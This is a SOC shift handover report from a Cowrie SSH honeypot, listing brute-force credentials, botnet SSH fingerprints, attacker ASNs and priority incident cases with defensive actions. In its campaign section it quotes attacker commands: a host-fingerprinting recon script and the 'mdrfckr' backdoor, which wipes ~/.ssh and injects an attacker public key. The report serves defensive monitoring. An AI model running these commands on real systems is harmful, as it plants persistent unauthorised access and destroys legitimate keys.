# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-16 |
| **Generated At** | 2026-08-16T12:46:28Z |
| **Shift Time** | 12:46 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **4758** |
| Confirmed Threats | **4745** |
| False Positives Filtered | **13** (0.3%) |
| Unique Attacker IPs | **81** |
| Countries of Origin | **30** |
| High Severity Cases | **137** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **4621** |
| Malware Samples Analyzed | **2** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **158** |
| Unique Credential Pairs | **109** |
| Unique Usernames | **29** |
| Unique Passwords | **63** |
| Successful Auth Pairs | **145** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 23 |
| `admin` | 22 |
| `support` | 15 |
| `developer` | 12 |
| `test` | 10 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `0987654321` | 9 |
| `letmein` | 7 |
| `123456` | 7 |
| `12345678` | 7 |
| `p@ssword` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `test` | `p@ssword` | 6 |
| `345gs5662d34` | `345gs5662d34` | 6 |
| `support` | `support` | 5 |
| `config` | `letmein` | 5 |
| `support` | `0987654321` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `sonar` | `sonar` | `217.165.22.192` | 2026-08-16T08:56:22 |
| `config` | `1qaz2wsx` | `177.159.150.111` | 2026-08-16T08:57:15 |
| `test` | `p@ssword` | `10.0.0.73` | 2026-08-16T08:58:31 |
| `test` | `p@ssword` | `92.84.21.186` | 2026-08-16T08:59:53 |
| `test` | `p@ssword` | `24.97.253.246` | 2026-08-16T09:00:04 |
| `blank` | `abc123` | `112.30.127.9` | 2026-08-16T09:02:32 |
| `debian` | `webadmin` | `179.185.18.67` | 2026-08-16T09:05:10 |
| `debian` | `webadmin` | `117.241.77.78` | 2026-08-16T09:05:25 |
| `debian` | `webadmin` | `183.223.156.154` | 2026-08-16T09:05:27 |
| `debian` | `webadmin` | `208.96.233.67` | 2026-08-16T09:05:34 |
| `support` | `support` | `176.53.159.196` | 2026-08-16T09:06:13 |
| `root` | `Aa123456..` | `45.142.193.164` | 2026-08-16T09:06:53 |
| `blank` | `abc123` | `10.0.0.73` | 2026-08-16T09:14:07 |
| `root` | `111111` | `195.178.110.232` | 2026-08-16T09:14:26 |
| `ubuntu` | `ubuntu` | `217.165.22.192` | 2026-08-16T09:15:29 |
| `root` | `123123` | `195.178.110.232` | 2026-08-16T09:16:12 |
| `test` | `p@ssword` | `112.161.26.125` | 2026-08-16T09:16:21 |
| `test` | `p@ssword` | `111.70.23.238` | 2026-08-16T09:16:31 |
| `root` | `1234` | `195.178.110.232` | 2026-08-16T09:17:56 |
| `root` | `12345` | `195.178.110.232` | 2026-08-16T09:19:42 |
| `config` | `letmein` | `10.0.0.73` | 2026-08-16T09:20:28 |
| `root` | `12345678` | `195.178.110.232` | 2026-08-16T09:23:22 |
| `root` | `123456789` | `195.178.110.232` | 2026-08-16T09:25:05 |
| `support` | `support` | `10.0.0.73` | 2026-08-16T09:25:17 |
| `root` | `Password1` | `195.178.110.232` | 2026-08-16T09:26:48 |
| `ubuntu` | `Adm1n1$trat0r` | `185.74.59.14` | 2026-08-16T09:26:51 |
| `root` | `admin` | `195.178.110.232` | 2026-08-16T09:28:35 |
| `hoster` | `P@ssw0rd` | `156.236.31.85` | 2026-08-16T09:29:49 |
| `345gs5662d34` | `345gs5662d34` | `156.236.31.85` | 2026-08-16T09:29:51 |
| `hoster` | `3245gs5662d34` | `156.236.31.85` | 2026-08-16T09:29:52 |
| `root` | `admin123` | `195.178.110.232` | 2026-08-16T09:30:20 |
| `blank` | `abc123` | `65.20.138.3` | 2026-08-16T09:31:28 |
| `root` | `default` | `195.178.110.232` | 2026-08-16T09:32:04 |
| `support` | `0987654321` | `10.0.0.73` | 2026-08-16T09:32:25 |
| `root` | `letmein` | `195.178.110.232` | 2026-08-16T09:33:46 |
| `support` | `0987654321` | `190.12.109.162` | 2026-08-16T09:34:00 |
| `support` | `0987654321` | `183.167.234.154` | 2026-08-16T09:34:09 |
| `ftpuser` | `ftpuser` | `217.165.22.192` | 2026-08-16T09:34:36 |
| `root` | `passw0rd` | `195.178.110.232` | 2026-08-16T09:35:30 |
| `ubnt` | `0987654321` | `85.19.195.12` | 2026-08-16T09:36:19 |
| `ubnt` | `0987654321` | `61.184.128.210` | 2026-08-16T09:36:29 |
| `root` | `password` | `195.178.110.232` | 2026-08-16T09:37:16 |
| `root` | `qwerty` | `195.178.110.232` | 2026-08-16T09:38:58 |
| `config` | `letmein` | `138.118.213.68` | 2026-08-16T09:39:05 |
| `config` | `letmein` | `170.247.3.15` | 2026-08-16T09:39:10 |
| `config` | `letmein` | `109.233.21.109` | 2026-08-16T09:39:18 |
| `root` | `system` | `195.178.110.232` | 2026-08-16T09:42:14 |
| `root` | `9ol.0p` | `45.142.193.164` | 2026-08-16T09:43:31 |
| `root` | `toor` | `195.178.110.232` | 2026-08-16T09:43:51 |
| `admin` | `111111` | `195.178.110.232` | 2026-08-16T09:45:30 |
| `admin` | `123123` | `195.178.110.232` | 2026-08-16T09:47:14 |
| `ubnt` | `0987654321` | `10.0.0.73` | 2026-08-16T09:47:56 |
| `default` | `webmaster` | `182.76.36.62` | 2026-08-16T09:49:05 |
| `admin` | `1234` | `195.178.110.232` | 2026-08-16T09:49:07 |
| `support` | `0987654321` | `117.250.19.91` | 2026-08-16T09:50:05 |
| `support` | `0987654321` | `196.216.81.126` | 2026-08-16T09:50:19 |
| `ubuntu` | `Password0!` | `185.74.59.14` | 2026-08-16T09:50:56 |
| `joe` | `test` | `128.1.38.105` | 2026-08-16T09:51:00 |
| `admin` | `12345` | `195.178.110.232` | 2026-08-16T09:51:04 |
| `345gs5662d34` | `345gs5662d34` | `128.1.38.105` | 2026-08-16T09:51:09 |
| `joe` | `3245gs5662d34` | `128.1.38.105` | 2026-08-16T09:51:11 |
| `admin` | `123456` | `195.178.110.232` | 2026-08-16T09:52:43 |
| `michael` | `michael` | `217.165.22.192` | 2026-08-16T09:53:43 |
| `guest` | `guest` | `103.147.248.23` | 2026-08-16T09:54:15 |
| `admin` | `12345678` | `195.178.110.232` | 2026-08-16T09:54:22 |
| `admin` | `admin2004` | `10.0.0.73` | 2026-08-16T09:54:24 |
| `admin` | `123456789` | `195.178.110.232` | 2026-08-16T09:55:51 |
| `admin` | `Administrator` | `195.178.110.232` | 2026-08-16T09:57:21 |
| `admin` | `access` | `195.178.110.232` | 2026-08-16T09:58:51 |
| `admin` | `admin` | `195.178.110.232` | 2026-08-16T10:00:23 |
| `root` | `qweasdzxc123!@#` | `45.142.193.164` | 2026-08-16T10:01:58 |
| `admin` | `admin123` | `195.178.110.232` | 2026-08-16T10:01:59 |
| `ubuntu` | `12345678aA` | `185.74.59.14` | 2026-08-16T10:03:01 |
| `admin` | `adminadmin` | `195.178.110.232` | 2026-08-16T10:03:38 |
| `admin` | `letmein` | `195.178.110.232` | 2026-08-16T10:05:26 |
| `support` | `123654` | `10.0.0.73` | 2026-08-16T10:06:22 |
| `admin` | `passw0rd` | `195.178.110.232` | 2026-08-16T10:07:23 |
| `support` | `123654` | `177.174.0.3` | 2026-08-16T10:07:57 |
| `support` | `123654` | `70.89.116.5` | 2026-08-16T10:08:05 |
| `admin` | `password` | `195.178.110.232` | 2026-08-16T10:09:04 |
| `Admin` | `Admin123!` | `65.20.217.64` | 2026-08-16T10:10:22 |
| `admin` | `password1` | `195.178.110.232` | 2026-08-16T10:10:38 |
| `admin` | `qwerty` | `195.178.110.232` | 2026-08-16T10:12:10 |
| `admin` | `admin2004` | `218.202.143.68` | 2026-08-16T10:12:45 |
| `sdbadmin` | `sdbadmin` | `217.165.22.192` | 2026-08-16T10:12:50 |
| `admin` | `admin2004` | `200.89.159.59` | 2026-08-16T10:12:54 |
| `admin` | `admin2004` | `222.92.61.242` | 2026-08-16T10:12:58 |
| `apache` | `1234` | `195.178.110.232` | 2026-08-16T10:13:40 |
| `apache` | `12345678` | `195.178.110.232` | 2026-08-16T10:15:07 |
| `test` | `test@123` | `201.76.120.30` | 2026-08-16T10:15:43 |
| `345gs5662d34` | `345gs5662d34` | `201.76.120.30` | 2026-08-16T10:15:46 |
| `test` | `3245gs5662d34` | `201.76.120.30` | 2026-08-16T10:15:47 |
| `apache` | `admin` | `195.178.110.232` | 2026-08-16T10:16:31 |
| `apache` | `apache` | `195.178.110.232` | 2026-08-16T10:17:57 |
| `marek` | `123456` | `186.13.24.118` | 2026-08-16T10:18:40 |
| `345gs5662d34` | `345gs5662d34` | `186.13.24.118` | 2026-08-16T10:18:43 |
| `marek` | `3245gs5662d34` | `186.13.24.118` | 2026-08-16T10:18:44 |
| `apache` | `password` | `195.178.110.232` | 2026-08-16T10:19:26 |
| `backup` | `123` | `195.178.110.232` | 2026-08-16T10:21:02 |
| `Admin` | `Admin123!` | `10.0.0.73` | 2026-08-16T10:21:57 |
| `backup` | `12345678` | `195.178.110.232` | 2026-08-16T10:22:38 |
| `support` | `123654` | `124.133.10.66` | 2026-08-16T10:24:05 |
| `backup` | `password` | `195.178.110.232` | 2026-08-16T10:24:13 |
| `root` | `!qaz2wsx` | `115.191.22.111` | 2026-08-16T10:25:10 |
| `developer` | `1` | `195.178.110.232` | 2026-08-16T10:25:54 |
| `ubuntu` | `roz@#2536` | `185.74.59.14` | 2026-08-16T10:27:10 |
| `developer` | `123` | `195.178.110.232` | 2026-08-16T10:27:35 |
| `developer` | `1234` | `195.178.110.232` | 2026-08-16T10:29:19 |
| `developer` | `12345` | `195.178.110.232` | 2026-08-16T10:31:08 |
| `oracle` | `123456` | `217.165.22.192` | 2026-08-16T10:31:57 |
| `developer` | `123456` | `195.178.110.232` | 2026-08-16T10:32:51 |
| `developer` | `1234567` | `195.178.110.232` | 2026-08-16T10:34:17 |
| `developer` | `12345678` | `195.178.110.232` | 2026-08-16T10:35:44 |
| `test` | `Passw0rd` | `175.43.162.226` | 2026-08-16T10:36:46 |
| `test` | `Passw0rd` | `124.239.169.52` | 2026-08-16T10:36:59 |
| `developer` | `123456789` | `195.178.110.232` | 2026-08-16T10:37:10 |
| `developer` | `1234567890` | `195.178.110.232` | 2026-08-16T10:38:35 |
| `arkserver` | `ark` | `163.7.3.241` | 2026-08-16T10:38:37 |
| `root` | `Pp123456` | `45.142.193.164` | 2026-08-16T10:38:40 |
| `345gs5662d34` | `345gs5662d34` | `163.7.3.241` | 2026-08-16T10:38:42 |
| `arkserver` | `3245gs5662d34` | `163.7.3.241` | 2026-08-16T10:38:43 |
| `Admin` | `Admin123!` | `65.20.233.110` | 2026-08-16T10:38:59 |
| `Admin` | `Admin123!` | `63.135.169.175` | 2026-08-16T10:39:06 |
| `ubuntu` | `Asd123456` | `185.74.59.14` | 2026-08-16T10:39:08 |
| `life` | `password` | `203.116.129.55` | 2026-08-16T10:39:18 |
| `345gs5662d34` | `345gs5662d34` | `203.116.129.55` | 2026-08-16T10:39:27 |
| `life` | `3245gs5662d34` | `203.116.129.55` | 2026-08-16T10:39:32 |
| `developer` | `abc123` | `195.178.110.232` | 2026-08-16T10:40:03 |
| `debian` | `qwerty12` | `10.0.0.73` | 2026-08-16T10:40:23 |
| `developer` | `password` | `195.178.110.232` | 2026-08-16T10:41:31 |
| `debian` | `qwerty12` | `60.174.39.82` | 2026-08-16T10:41:55 |
| `debian` | `qwerty12` | `117.158.166.73` | 2026-08-16T10:42:05 |
| `developer` | `qwerty` | `195.178.110.232` | 2026-08-16T10:42:58 |
| `ubnt` | `123123` | `183.239.20.236` | 2026-08-16T10:44:14 |
| `ubnt` | `123123` | `218.25.233.22` | 2026-08-16T10:44:24 |
| `docker` | `123` | `195.178.110.232` | 2026-08-16T10:44:30 |
| `docker` | `123456` | `195.178.110.232` | 2026-08-16T10:46:08 |
| `config` | `1234567` | `65.20.134.97` | 2026-08-16T10:46:51 |
| `config` | `1234567` | `179.181.133.153` | 2026-08-16T10:46:59 |
| `docker` | `12345678` | `195.178.110.232` | 2026-08-16T10:47:46 |
| `docker` | `123456789` | `195.178.110.232` | 2026-08-16T10:49:26 |
| `bin` | `smoker666` | `217.165.22.192` | 2026-08-16T10:51:04 |
| `docker` | `docker` | `195.178.110.232` | 2026-08-16T10:51:08 |
| `ec2-user` | `123456` | `195.178.110.232` | 2026-08-16T10:52:52 |
| `ec2-user` | `12345678` | `195.178.110.232` | 2026-08-16T10:54:34 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **4758** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 82 |
| OpenSSH | 46 |
| libssh | 19 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 62 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 40 | 40 |
| `f555226df196...` | Mirai/variant | 19 | 7 |
| `98ddc5604ef6...` | Modern SSH client | 9 | 2 |
| `e45f2d6d7f79...` | Mirai/variant | 7 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 62 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 40 | 40 | Mirai/variant |
| `f555226df196...` | libssh | 19 | 7 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 9 | 2 | Modern SSH client |
| `e45f2d6d7f79...` | Go SSH scanner | 7 | 1 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 6 | 2 | — |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `dd9bcf093c35...` | Unknown | 2 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 60 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 6 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.232`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `203.116.129.55`, `128.1.38.105`, `156.236.31.85`, `186.13.24.118`, `163.7.3.241`, `201.76.120.30`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **81** |
| Unique ASNs | **61** |
| High-Risk ASNs | **52** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS3301` | Telia Company AB | 4 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 4 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 4 | HIGH |
| `AS18881` | TELEFÔNICA BRASIL S.A | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS9829` | National Internet Backbone | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (137)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-fa3c95d2f28d

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 08:56 |
| **Last Seen** | 2026-08-16 08:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 08:56:21` | `cowrie.session.connect` |
| `2026-08-16 08:56:21` | `cowrie.client.version` |
| `2026-08-16 08:56:21` | `cowrie.client.kex` |
| `2026-08-16 08:56:22` | `cowrie.login.success` |
| `2026-08-16 08:56:23` | `cowrie.session.params` |
| `2026-08-16 08:56:23` | `cowrie.command.input` |
| `2026-08-16 08:56:23` | `cowrie.log.closed` |
| `2026-08-16 08:56:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5672eee3c31

| Field | Detail |
|---|---|
| **Source IP** | `177.159.150[.]111` |
| **First Seen** | 2026-08-16 08:57 |
| **Last Seen** | 2026-08-16 08:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 08:57:12` | `cowrie.session.connect` |
| `2026-08-16 08:57:13` | `cowrie.client.version` |
| `2026-08-16 08:57:13` | `cowrie.client.kex` |
| `2026-08-16 08:57:15` | `cowrie.login.success` |
| `2026-08-16 08:57:16` | `cowrie.direct-tcpip.request` |
| `2026-08-16 08:57:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.159.150[.]111` to AbuseIPDB if not already reported
- [ ] Block `177.159.150[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eef47ab2c657

| Field | Detail |
|---|---|
| **Source IP** | `92.84.21[.]186` |
| **First Seen** | 2026-08-16 08:59 |
| **Last Seen** | 2026-08-16 08:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 08:59:50` | `cowrie.session.connect` |
| `2026-08-16 08:59:51` | `cowrie.client.version` |
| `2026-08-16 08:59:51` | `cowrie.client.kex` |
| `2026-08-16 08:59:53` | `cowrie.login.success` |
| `2026-08-16 08:59:53` | `cowrie.direct-tcpip.request` |
| `2026-08-16 08:59:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.84.21[.]186` to AbuseIPDB if not already reported
- [ ] Block `92.84.21[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0c4139b8d62

| Field | Detail |
|---|---|
| **Source IP** | `24.97.253[.]246` |
| **First Seen** | 2026-08-16 09:00 |
| **Last Seen** | 2026-08-16 09:05 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:00:03` | `cowrie.session.connect` |
| `2026-08-16 09:00:03` | `cowrie.client.version` |
| `2026-08-16 09:00:03` | `cowrie.client.kex` |
| `2026-08-16 09:00:04` | `cowrie.login.success` |
| `2026-08-16 09:00:05` | `cowrie.direct-tcpip.request` |
| `2026-08-16 09:05:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.97.253[.]246` to AbuseIPDB if not already reported
- [ ] Block `24.97.253[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba55ad030a8f

| Field | Detail |
|---|---|
| **Source IP** | `112.30.127[.]9` |
| **First Seen** | 2026-08-16 09:02 |
| **Last Seen** | 2026-08-16 09:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:02:28` | `cowrie.session.connect` |
| `2026-08-16 09:02:29` | `cowrie.client.version` |
| `2026-08-16 09:02:29` | `cowrie.client.kex` |
| `2026-08-16 09:02:32` | `cowrie.login.success` |
| `2026-08-16 09:02:33` | `cowrie.direct-tcpip.request` |
| `2026-08-16 09:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.30.127[.]9` to AbuseIPDB if not already reported
- [ ] Block `112.30.127[.]9` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e453610ebde8

| Field | Detail |
|---|---|
| **Source IP** | `179.185.18[.]67` |
| **First Seen** | 2026-08-16 09:05 |
| **Last Seen** | 2026-08-16 09:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:05:08` | `cowrie.session.connect` |
| `2026-08-16 09:05:08` | `cowrie.client.version` |
| `2026-08-16 09:05:08` | `cowrie.client.kex` |
| `2026-08-16 09:05:10` | `cowrie.login.success` |
| `2026-08-16 09:05:10` | `cowrie.direct-tcpip.request` |
| `2026-08-16 09:05:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.18[.]67` to AbuseIPDB if not already reported
- [ ] Block `179.185.18[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ec35f5af4c2

| Field | Detail |
|---|---|
| **Source IP** | `183.223.156[.]154` |
| **First Seen** | 2026-08-16 09:05 |
| **Last Seen** | 2026-08-16 09:05 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:05:21` | `cowrie.session.connect` |
| `2026-08-16 09:05:23` | `cowrie.client.version` |
| `2026-08-16 09:05:23` | `cowrie.client.kex` |
| `2026-08-16 09:05:27` | `cowrie.login.success` |
| `2026-08-16 09:05:30` | `cowrie.direct-tcpip.request` |
| `2026-08-16 09:05:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.223.156[.]154` to AbuseIPDB if not already reported
- [ ] Block `183.223.156[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-980b8cc2692a

| Field | Detail |
|---|---|
| **Source IP** | `117.241.77[.]78` |
| **First Seen** | 2026-08-16 09:05 |
| **Last Seen** | 2026-08-16 09:05 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:05:21` | `cowrie.session.connect` |
| `2026-08-16 09:05:22` | `cowrie.client.version` |
| `2026-08-16 09:05:22` | `cowrie.client.kex` |
| `2026-08-16 09:05:25` | `cowrie.login.success` |
| `2026-08-16 09:05:25` | `cowrie.direct-tcpip.request` |
| `2026-08-16 09:05:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.241.77[.]78` to AbuseIPDB if not already reported
- [ ] Block `117.241.77[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd224deecad4

| Field | Detail |
|---|---|
| **Source IP** | `208.96.233[.]67` |
| **First Seen** | 2026-08-16 09:05 |
| **Last Seen** | 2026-08-16 09:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:05:32` | `cowrie.session.connect` |
| `2026-08-16 09:05:33` | `cowrie.client.version` |
| `2026-08-16 09:05:33` | `cowrie.client.kex` |
| `2026-08-16 09:05:34` | `cowrie.login.success` |
| `2026-08-16 09:05:34` | `cowrie.direct-tcpip.request` |
| `2026-08-16 09:05:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `208.96.233[.]67` to AbuseIPDB if not already reported
- [ ] Block `208.96.233[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b336bfd1368b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-16 09:06 |
| **Last Seen** | 2026-08-16 09:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:06:12` | `cowrie.session.connect` |
| `2026-08-16 09:06:12` | `cowrie.client.version` |
| `2026-08-16 09:06:12` | `cowrie.client.kex` |
| `2026-08-16 09:06:13` | `cowrie.login.success` |
| `2026-08-16 09:06:13` | `cowrie.direct-tcpip.request` |
| `2026-08-16 09:06:13` | `cowrie.direct-tcpip.data` |
| `2026-08-16 09:06:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-647ddc26efff

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
